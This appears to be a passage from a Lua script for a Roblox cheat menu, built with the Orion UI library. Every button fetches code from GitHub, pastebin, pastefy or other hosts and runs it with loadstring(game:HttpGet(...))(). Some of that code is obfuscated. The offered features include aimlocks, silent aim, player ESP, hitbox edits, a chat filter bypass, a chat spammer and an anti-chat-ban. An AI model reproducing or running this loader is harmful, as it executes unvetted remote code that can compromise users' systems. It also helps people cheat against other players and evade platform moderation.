Name = "Fe Throw Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Gd"))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "99% Fail Impossible Obby Script"
})

Tab6:AddButton({
Name = "99% Fail Impossible Obby Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/99-fail-impossible-obby/main/ok",true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Flash Lock"
})

TabAL:AddButton({
Name = "Flash Lock",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/GXma0NrL",true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Orange Box Lock"
})

TabAL:AddButton({
Name = "Orange Box Lock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryzzchips/SubtoRyzzchips/6942334039b725b3ea380aaa7959949f938c2dc9/obf_swVYM0h5h3Rk75C9yprMgKc2ER64968pH0zAy2E30o3H3smBe01xnvZNwrm6oDYo.lua.txt", true))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Speed Tool"
})

TabDH:AddButton({
Name = "Speed Tool",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/EX6qHypK", true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "BH"
})

Tab3:AddButton({
Name = "British Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RedCoat8102/Britishhub/main/Protected_2739214986728285.lua.txt"))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Swag Mode"
})

TabDH:AddButton({
Name = "Swag Mode",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = " Rage AimLock"
})

TabAL:AddButton({
Name = "Rage AimLock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryzzchips/SubtoRyzzchips/main/Sub%20to%20Ryzzchips%20for%20more%20New%20aimlock%20script!"))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "RayCode X"
})

TabDH:AddButton({
Name = "RayCode X",
Callback = function()
loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Kirbs Ware Anti Lock"
})

TabDH:AddButton({
Name = "Kirbs Ware Anti Lock",
Callback = function()
loadstring(game:HttpGet('https://github.com/Kirbsware/script/raw/main/Mobile'))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Keybind Maker"
})

Tab6:AddButton({
Name = "Keybind Maker",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/Ujm4HWxh/raw'),true))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "NukerMode"
})

TabDH:AddButton({
Name = "NukerMode",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Tenaki Camlock"
})

TabAL:AddButton({
Name = "Tenaki Camlock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Tenkai./main/imean.Tenaki",true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "KeyStrokes Script"
})

Tab6:AddButton({
Name = "KeyStrokes Script",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/Te4dwSw2/raw'),true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "KeyBind Maker Script"
})

Tab6:AddButton({
Name = "KeyBind Maker Script",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/Ujm4HWxh/raw'),true))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Faded Hub"
})

TabDH:AddButton({
Name = "Faded Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "Pluto Hub"
})

TabDH:AddButton({
Name = "Pluto Hub",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua', true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Rtx & Shader"
})

Tab6:AddButton({
Name = "Shader Script",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
print("Script Executed")
end 
})

Tab6:AddButton({
Name = "Rtx Script",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/BIr8OzrR/raw'),true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Red Dot Lock Script"
})

TabAL:AddButton({
Name = "Red Dot Lock Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/reddot1/main/reddot1", true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Chat Bypass"
})

Tab6:AddButton({
Name = "Chat Bypass",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Chat/main/Bypass",true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Chat Spammer"
})

Tab6:AddButton({
Name = "Chat Spammer",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/chatspammer/main/chatspammer", true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Shift Locks"
})

Tab2:AddButton({
Name = "Temporary ShiftLock",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/WQ9NPeDS'))();
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Perm ShiftLock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/PermShiftLock/main/S",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Chat Hax"
})

Tab2:AddButton({
Name = "Chat Hax",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Esclipe Hub"
})

Tab3:AddButton({
Name = "Esclipe Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Esclipe-Hub-V-0.95/main/Real",true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Fake Tools V4"
})

Tab2:AddButton({
Name = "Fe Fake Tools V4",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Player Orbit"
})

Tab2:AddButton({
Name = "Fe Player Orbit",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Better Roblox"
})

Tab2:AddButton({
Name = "Better Roblox",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/betterrobloxui/main/betterroblox", true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Boombox Scripts"
})

Tab6:AddButton({
Name = "DHRP Boombox Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Dollhouse/main/Roleplay",true))()
print("Script Executed")
end 
})

Tab6:AddButton({
Name = "PineApple Boombox Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/boombox/main/script",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "GigaChad Hub"
})

Tab3:AddButton({
Name = "GigaChad Hub",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Version%20V3.5'))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Player Esp"
})

Tab2:AddButton({
Name = "Player Esp V1",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/box.esp/main/s",true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Player Esp V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/name.esp/main/s",true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Player Esp V3",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/charm/main/esp",true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Player Esp V4",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/blue./main/esp",true))()
print("Script Executed")
end 
})

Tab2:AddButton({
Name = "Player Esp V5",
Callback = function()
loadstring(game:HttpGet("https://paste.gg/p/anonymous/7259b0557ebf44ccabf2f7b58dc79899/files/0475cb5d744642a2b572e3a8af205588/raw"))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Ios W Lock"
})

TabAL:AddButton({
Name = "Ios W Lock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/iosW/main/Lock",true))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Make Ppl Fly Script"
})

Tab6:AddButton({
Name = "Make Ppl Fly Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/fe-make-ppl-fly/main/s",true))()
print("Script Executed")
end 
})

local TabDHSection = TabDH:AddSection({
Name = "DragonWare AimLock Hub"
})

TabDH:AddButton({
Name = "DragonWare AimLock Hub",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ChaseSYNX/Scripts/main/DragonWareAimlock')))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Hacker Chat"
})

Tab2:AddButton({
Name = "Fe Hacker Chat",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/hacker./main/chat",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Game Script Hub V3"
})

Tab3:AddButton({
Name = "Game Script Hub V3",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Multi Scriper X V2"
})

Tab3:AddButton({
Name = "Multi Scripter X V2",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Multi-Scripter-X/main/loader"))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Silent Aim Gui [ Bad ]"
})

TabAL:AddButton({
Name = "Silent Aim Gui [ Bad ]",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zuwdaq/legit-slient-aim-script/main/legit",true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Nyula Gui"
})

TabAL:AddButton({
Name = "Nyula Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/nyula", true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "i forgor Hub"
})

Tab3:AddButton({
Name = "i forgor Hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/iforgotmodz/Universal-Script-Loader/main/Updated1.3"))()
print("Script Executed")
end 
})

local Tab6Section = Tab6:AddSection({
Name = "Low Gfx"
})

Tab6:AddButton({
Name = "Low Gfx",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zQUqDRdJ",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "White Room Script Gui"
})

Tab3:AddButton({
Name = "White Room Script Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NFMS-1/WRUI/main/1", true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "ImperialW Lock"
})

TabAL:AddButton({
Name = "ImperialW Lock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/imperialw/main/imperialw",true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Haalfi-cc Lock"
})

TabAL:AddButton({
Name = "Haalfi-cc Lock",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/DaHood", true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Player Collision"
})

Tab2:AddButton({
Name = "Fe Player Collision",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Collision.txt'),true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Zombie Scripr"
})

Tab2:AddButton({
Name = "Fe Zombie Script",
Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Walk On Wall Script"
})

Tab2:AddButton({
Name = "Fe Walk On Wall Script",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe Anti Chat Ban"
})

Tab2:AddButton({
Name = "Fe Anti Chat Ban",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/Wqxzdi1q'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Sync TRD Script Gui"
})

Tab3:AddButton({
Name = "Sync TRD Script Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kureu/Roblox-T.R.D-Camp-Script/main/Roblox%20T.R.D%20Camp%20Script"))();
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Prtty Much Evry Bordr Game Vr Script"
})

Tab3:AddButton({
Name = "Prtty Much Evry Bordr Game Vr",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/memejames/New/main/Hub'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Ghost Hub"
})

Tab3:AddButton({
Name = "Ghost Hub",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Ice Hub"
})

Tab3:AddButton({
Name = "Ice Hub",
Callback = function()
loadstring(game:HttpGet("https://icehub.cf/IceHubLoader"))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Silent Aim Script"
})

TabAL:AddButton({
Name = "Silent Aim Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/silents.aim/main/s",true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "Funky Friday Script Gui"
})

Tab3:AddButton({
Name = "Funky Friday Script Guu",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "The Best Strongest Battle Ground Script Gui"
})

Tab3:AddButton({
Name = "The Best Strongest Battle Ground Script Gui Key: [ BestTheStrongest5412Roblox ]",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Strongest/main/Battlegrounds77"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "RoGhoul Script Gui"
})

Tab3:AddButton({
Name = "RoGhoul Script Gui",
Callback = function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader")()
print("Script Executed")
end 
})

local Tab2Section = Tab2:AddSection({
Name = "Fe R15 To R6"
})

Tab2:AddButton({
Name = "Fe R15 To R6",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
Name = "FrontLines Script Gui"
})

Tab3:AddButton({
Name = "FrontLines Script Gui",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/frontlines./main/hitbox",true))()
print("Script Executed")
end 
})

local TabALSection = TabAL:AddSection({
Name = "Best Silent Aim"
})

TabAL:AddButton({
Name = "Silent Aim (Q To silent aim)",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/B1ufXMph",true))()
print("Script Executed")
end 
})


OrionLib:Init()
